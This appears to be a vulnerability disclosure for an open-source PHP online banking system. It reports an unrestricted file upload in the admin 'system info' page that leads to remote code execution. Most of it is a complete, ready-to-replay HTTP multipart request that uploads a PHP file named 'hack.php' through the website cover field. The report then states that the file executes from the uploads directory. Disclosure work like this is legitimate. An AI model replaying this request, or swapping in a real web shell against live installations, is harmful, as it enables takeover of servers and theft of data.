## Banking-system v1.0 by oretnom23 has arbitrary code execution (RCE)

vendor: https://www.sourcecodester.com/php/14868/banking-system-using-php-free-source-code.html

Vulnerability url: http://ip/banking/admin/?page=system_info 

Loophole location： Arbitrary file upload vulnerability exists in Website Cover upload point in system info (RCE)

Request package for file upload：

```sql
POST /banking/classes/SystemSettings.php?f=update_settings HTTP/1.1
Host: 192.168.1.19
Content-Length: 838
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhors6Id7gZ8p807A
Origin: http://192.168.1.19
Referer: http://192.168.1.19/banking/admin/?page=system_info
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=v8g2iaa0tsnt5b01btt83eb7qo
Connection: close

------WebKitFormBoundaryhors6Id7gZ8p807A
Content-Disposition: form-data; name="name"

Online Banking System
------WebKitFormBoundaryhors6Id7gZ8p807A
Content-Disposition: form-data; name="short_name"

OBS
------WebKitFormBoundaryhors6Id7gZ8p807A
Content-Disposition: form-data; name="about_us"

<p>Sample About Us</p>
------WebKitFormBoundaryhors6Id7gZ8p807A
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryhors6Id7gZ8p807A
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryhors6Id7gZ8p807A
Content-Disposition: form-data; name="cover"; filename="hack.php" // Upload point
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
------WebKitFormBoundaryhors6Id7gZ8p807A--


```

The files will be uploaded to this directory\ banking\ uploads\

![image](https://user-images.githubusercontent.com/54017627/161221003-e1e15b17-fc99-4dbd-bd06-794b93919e6e.png)

We visited the directory of the file in the browser and found that the code had been executed

![image](https://user-images.githubusercontent.com/54017627/161220963-4788d174-8a5d-4aa4-bc7a-c5c60b620d16.png)

